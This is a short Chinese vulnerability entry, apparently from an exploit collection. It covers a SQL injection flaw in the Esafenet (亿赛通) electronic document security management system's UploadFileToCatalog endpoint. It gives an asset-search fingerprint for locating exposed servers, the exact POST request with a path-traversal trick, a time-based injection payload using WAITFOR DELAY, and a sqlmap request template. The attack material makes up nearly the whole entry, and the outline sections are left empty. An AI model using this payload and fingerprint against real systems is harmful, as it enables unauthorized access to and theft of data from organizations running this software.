# 亿赛通电子文档安全管理系统UploadFileToCatalog存在SQL注入漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
id=1';WAITFOR DELAY '0:0:3'--

sqlmap
POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
id=1

\[亿赛通电子文档安全管理系统-uploadfiletocatalog-sql注入.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 亿赛通电子文档安全管理系统UploadFileToCatalog存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统